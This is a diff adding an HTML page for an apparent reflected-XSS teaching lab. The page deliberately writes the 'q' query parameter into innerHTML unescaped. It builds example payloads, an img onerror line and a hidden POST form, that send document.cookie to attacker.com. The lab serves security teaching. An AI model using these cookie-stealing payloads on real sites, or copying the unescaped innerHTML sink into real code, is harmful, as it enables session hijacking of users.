@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>XSS Lab</title>
+</head>
+<body>
+  <nav>
+    <strong>XSS Lab</strong>
+    |
+    <a href="/">Reflected XSS</a>
+    |
+    <a href="/stored.html">Stored XSS</a>
+  </nav>
+  <h1>Reflected XSS</h1>
+  <p id="jar"></p>
+  <form method="get">
+    <input name="q" placeholder="q">
+    <button type="submit">Go</button>
+  </form>
+  <p><a id="example">Example: GET cookies to attacker.com</a></p>
+  <p><a id="post-example" href="#">Example: POST cookies to attacker.com</a></p>
+  <div id="result"></div>
+  <script>
+    document.getElementById('jar').textContent = 'Site cookies: ' + document.cookie;
+
+    const payload = '<img src=x onerror="new Image().src=\'https://attacker.com/?in=\'+encodeURIComponent(document.cookie)">';
+    document.getElementById('example').href = '/?q=' + encodeURIComponent(payload);
+
+    document.getElementById('post-example')?.addEventListener('click', (event) => {
+      event.preventDefault();
+      const frame = document.createElement('iframe');
+      frame.name = 'xss-post';
+      frame.hidden = true;
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://attacker.com/';
+      form.target = frame.name;
+      const input = document.createElement('input');
+      input.name = 'in';
+      input.value = document.cookie;
+      form.appendChild(input);
+      document.body.append(frame, form);
+      form.submit();
+    });
+
+    const q = new URLSearchParams(location.search).get('q');
+    if (q !== null) {
+      document.getElementById('result').innerHTML = q;
+    }
+  </script>
+</body>
+</html>
